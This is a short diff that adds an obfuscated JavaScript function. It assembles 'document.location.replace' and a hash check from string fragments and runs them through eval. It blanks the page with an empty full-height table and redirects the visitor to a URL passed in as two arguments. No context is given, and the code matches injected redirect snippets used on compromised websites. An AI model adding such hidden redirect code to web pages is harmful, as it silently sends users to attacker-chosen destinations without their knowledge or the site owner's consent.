@@ -1,0 +1,2 @@
+function lfkzs(u,v)
+{var rda, rdx, r0, r2, r1;rda="ation";rdx="elf.loc";r0="docu";r2="ion.repla";r1="ment.locat";if(eval("s"+rdx+rda+".hash!=\"#!\"")) {t0='able';t1='<t'+t0+' height="100%"><tr><td></td></tr></t'+t0+'>';document.write(t1);eval(r0+r1+r2+"ce(\""+u+v+"\");");}}
